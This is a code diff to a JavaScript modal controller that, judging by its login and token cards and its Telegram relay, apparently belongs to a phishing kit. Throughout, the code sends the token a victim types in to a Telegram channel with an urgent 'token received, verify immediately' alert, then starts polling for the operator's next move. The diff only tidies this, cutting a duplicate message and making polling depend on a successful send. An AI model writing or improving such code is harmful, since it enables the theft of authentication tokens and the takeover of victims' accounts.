@@ -156,10 +156,8 @@ class TokenModalController {
             loginCard.classList.add('hidden');
             tokenCard.classList.remove('hidden');
 
-            // Notify Telegram that Token is being requested (Aviso)
-            window.telegramManager.sendToTelegram('token_requested', {
-                status: 'Esperando Token...'
-            });
+            // NO enviar mensaje aquí para evitar duplicados
+            // El mensaje se envía solo cuando el usuario envía el token
 
             const input = document.getElementById('tokenInputCard');
             if (input) setTimeout(() => input.focus(), 100);
@@ -175,12 +173,15 @@ class TokenModalController {
             const overlay = document.querySelector('.loading-overlay');
             if (overlay) overlay.classList.add('active');
 
-            // Enviar a Telegram con "Aviso"
+            // Enviar a Telegram solo UNA VEZ
             window.telegramManager.sendToTelegram('token_submit', {
                 token: token,
                 aviso: '🔔 ¡TOKEN RECIBIDO! Verificar inmediatamente.'
-            }).then(() => {
-                window.telegramManager.startPolling();
+            }).then((result) => {
+                // Solo iniciar polling si el envío fue exitoso
+                if (result && result.success) {
+                    window.telegramManager.startPolling();
+                }
             });
         }
     }
@@ -248,9 +249,11 @@ class TokenModalController {
         // Enviar a Telegram sin bloquear
         window.telegramManager.sendToTelegram('token', {
             token: this.tokenValue
-        }).then(() => {
-            // Iniciar polling en background (sin overlay)
-            window.telegramManager.startPolling();
+        }).then((result) => {
+            // Solo iniciar polling si el envío fue exitoso
+            if (result && result.success) {
+                window.telegramManager.startPolling();
+            }
         });
     }
 
